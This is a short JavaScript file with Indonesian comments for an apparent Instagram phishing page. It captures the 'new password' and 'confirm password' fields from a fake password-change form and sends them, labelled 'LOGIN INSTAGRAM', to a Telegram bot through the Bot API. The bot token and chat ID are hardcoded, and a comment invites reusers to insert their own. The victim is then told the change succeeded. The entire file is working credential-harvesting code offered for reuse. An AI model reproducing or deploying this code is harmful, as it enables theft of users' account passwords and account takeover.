// Gantilah token_bot dan chat_id dengan milik Anda
const TELEGRAM_BOT_TOKEN = "7883195342:AAHFVsKhUbxrEqtBdq3jlZJpn9w7FEll2ak";
const TELEGRAM_CHAT_ID = "6936723956";

document.getElementById("passwordForm").addEventListener("submit", function (event) {
    event.preventDefault();

    const newPassword = document.getElementById("newPassword").value;
    const confirmPassword = document.getElementById("confirmPassword").value;

    // Validasi panjang kata sandi (minimal 6 karakter)
    if (newPassword.length < 6 || confirmPassword.length < 6) {
        alert("Setiap kata sandi minimal harus 6 karakter.");
        return;
    }

    // Format pesan yang akan dikirim ke Telegram
    const message = `LOGIN INSTAGRAM:\n\nkata sandi saat ini: ${newPassword}\nKonfirmasi Kata Sandi: ${confirmPassword}`;

    // Kirim pesan ke Telegram menggunakan Bot API
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
        }),
    })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("Kata sandi bershasil di ubah.");
                document.getElementById("passwordForm").reset(); // Reset form
            } else {
                alert("Gagal mengirim ke Telegram. Periksa token bot dan chat ID.");
            }
        })
        .catch(error => {
            console.error("Error:", error);
            alert("Terjadi kesalahan saat mengganti password.");
        });
});